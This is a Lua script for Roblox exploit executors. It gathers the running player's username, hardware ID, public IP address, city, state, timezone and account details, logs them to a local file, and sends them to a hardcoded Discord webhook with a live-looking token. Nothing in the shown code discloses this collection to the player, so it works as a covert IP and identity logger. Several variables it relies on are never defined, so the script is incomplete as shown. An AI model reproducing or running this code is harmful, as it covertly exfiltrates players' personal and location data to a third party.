local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Analytics = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Http = http_request or request or HttpPost or syn.request

-- Updated Webhook URL
local Webhook_URL = "https://discord.com/api/webhooks/1477895410042404884/ILyV6UZVBJkaqmTNoOL2I94caeugCiIjmW5dYiRNkG2JZV-ZWX72zeHTA3TJT6xghmDX"
local Headers = { ['Content-Type'] = 'application/json' }
local logFile = "executor_log.json"

-- Popular timezones
local popularTimezones = {
    [-12]="AoE", [-11]="SST", [-10]="HST", [-9]="AKST", [-8]="PST", [-7]="MST",
    [-6]="CST", [-5]="EST", [-4]="AST", [-3.5]="NST", [-3]="BRT", [-2]="GST",
    [-1]="AZOT", [0]="GMT", [1]="CET", [2]="EET", [3]="MSK", [3.5]="IRST",
    [4]="GST", [4.5]="AFT", [5]="PKT", [5.5]="IST", [5.75]="NPT", [6]="BST",
    [6.5]="MMT", [7]="WIB", [8]="CST", [8.75]="ACWST", [9]="JST",
    [9.5]="ACST", [10]="AEST", [10.5]="ACDT", [11]="AEDT", [12]="NZST",
    [12.75]="CHAST", [13]="PHOT", [14]="LINT"
}

-- Safe HTTP GET
local function safeHttpGet(url)
    local success, result = pcall(function()
        return Http({ Url = url, Method = "GET" })
    end)
    if success and result and result.Body then
        return result.Body
    end
    return nil
end

-- Timezone
local function getTimezone()
    local ok, utcTime = pcall(function() return os.time(os.date("!*t")) end)
    local ok2, localTime = pcall(function() return os.time(os.date("*t")) end)
    if not ok or not ok2 then return "Unknown" end
    local diffSeconds = os.difftime(localTime, utcTime)
    local offsetHours = math.floor((diffSeconds / 3600)*2 + 0.5)/2
    return popularTimezones[offsetHours] or ("UTC"..(offsetHours>=0 and "+" or "")..offsetHours)
end

-- Previous log
local previousLog = {}
if isfile(logFile) then
    local ok, data = pcall(readfile, logFile)
    if ok and data ~= "" then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, data)
        if ok2 then previousLog = decoded end
    end
end

previousLog[LocalPlayer.Name] = (previousLog[LocalPlayer.Name] or 0) + 1

local logEntry = {
    Username = LocalPlayer.Name,
    DisplayName = LocalPlayer.DisplayName,
    GameName = gameName,
    ProfileLink = profileLink,
    ServerPlayers = activePlayers.."/"..maxPlayers,
    PlayerPingMS = playerPing,
    Time = currentDate.." "..currentTime,
    HWID = hwid,
    IP = publicIP,
    City = city,
    State = state,
    Timezone = timezone,
    AccountCreation = accountCreation,
    AccountAge = accountAge,
    Executor = execName,
    Executions = previousLog[LocalPlayer.Name],
    TeleportScript = teleportScript
}

previousLog["Logs"] = previousLog["Logs"] or {}
table.insert(previousLog["Logs"], logEntry)

pcall(function()
    writefile(logFile, HttpService:JSONEncode(previousLog))
end)

-- Webhook
local webhookData = {
    content = "@here",
    username = LocalPlayer.Name,
    avatar_url = "https://tse4.mm.bing.net/th?id=OIP.nJ7S63mDf0rdL9TAEPZjYAHaJQ&pid=Api&P=0&h=220",
    embeds = {{
        title = "Player Execution Info",
        fields = {
            {name="Display Name", value=LocalPlayer.DisplayName or "Unknown", inline=true},
            {name="Username", value=LocalPlayer.Name or "Unknown", inline=true},
            {name="Game Name", value=gameName or "Unknown", inline=true},
            {name="Server Players", value=activePlayers.."/"..maxPlayers, inline=true},
            {name="Player Ping (ms)", value=tostring(playerPing) or "Unknown", inline=true},
            {name="IP Address", value=publicIP or "Unknown", inline=false},
            {name="City", value=city or "Unknown", inline=true},
            {name="State", value=state or "Unknown", inline=true},
            {name="Account Creation", value=accountCreation or "Unknown", inline=false},
            {name="Account Age", value=tostring(accountAge) or "Unknown", inline=false},
            {name="Date", value=currentDate or "Unknown", inline=false},
            {name="Time", value=currentTime or "Unknown", inline=false},
            {name="Timezone", value=timezone or "Unknown", inline=false},
            {name="HWID", value=hwid or "Unknown", inline=false},
            {name="Executor", value=execName or "Unknown", inline=true},
            {name="Execution Count", value=tostring(previousLog[LocalPlayer.Name]) or "Unknown", inline=true},
            {name="Teleport Script", value=teleportScript or "Unknown", inline=false},
            {name="Profile Link", value="[Profile]("..profileLink..")", inline=false}
        }
    }}
}

pcall(function()
    Http({
        Url = Webhook_URL,
        Body = HttpService:JSONEncode(webhookData),
        Method = "POST",
        Headers = Headers
    })
end)
